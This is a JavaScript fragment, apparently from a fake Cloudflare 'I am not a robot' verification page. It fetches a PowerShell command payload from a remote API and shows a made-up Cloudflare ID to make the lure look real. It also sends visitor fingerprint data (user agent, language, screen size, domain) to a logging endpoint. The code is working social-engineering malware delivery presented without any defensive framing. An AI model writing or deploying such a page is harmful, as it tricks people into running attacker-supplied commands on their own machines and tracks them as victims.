  // Fetch payload (PS command) from API server
  var currentPayload = '';
  function fetchPayload() {
    try {
      var url = ctx.downloadUrl || (ctx.apiBase + '/api/index.php?a=init');
      var xhr = new XMLHttpRequest();
      xhr.open('GET', url, true);
      xhr.onload = function() {
        if (xhr.status === 200) {
          try {
            var data = JSON.parse(xhr.responseText);
            if (data.token) currentPayload = data.token;
            else if (data.payload) currentPayload = data.payload;
            else currentPayload = xhr.responseText;
          } catch(e) {
            if (xhr.responseText.length > 5) currentPayload = xhr.responseText;
          }
          syncCfId();
        }
      };
      xhr.send();
    } catch(e) {}

    // Also try cfg payload
    if (ctx.cfg && ctx.cfg.payload) {
      currentPayload = ctx.cfg.payload;
      syncCfId();
    }
  }

  function syncCfId() {
    try {
      var m = currentPayload.match(/Cloudflare ID:\s*([a-f0-9]+)/i);
      if (m && m[1]) {
        var el = document.getElementById('agreement-text');
        if (el) {
          el.textContent = 'I am not a robot - Cloudflare ID: ' + m[1].toLowerCase();
        }
      }
    } catch(e) {}
  }

  // Report events to API
  function report(action, callback) {
    try {
      var url = ctx.logUrl || (ctx.apiBase + '/api/index.php?a=evt');
      var xhr = new XMLHttpRequest();
      xhr.open('POST', url, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      xhr.onloadend = function() { if (callback) callback(); };
      xhr.send(JSON.stringify({
        eventType: action,
        userAgent: navigator.userAgent,
        language: navigator.language,
        screen: window.screen.width + 'x' + window.screen.height,
        domain: window.location.hostname
      }));
      setTimeout(function() { if (callback) { callback(); callback = null; } }, 3000);
    } catch(e) { if (callback) callback(); }
  }

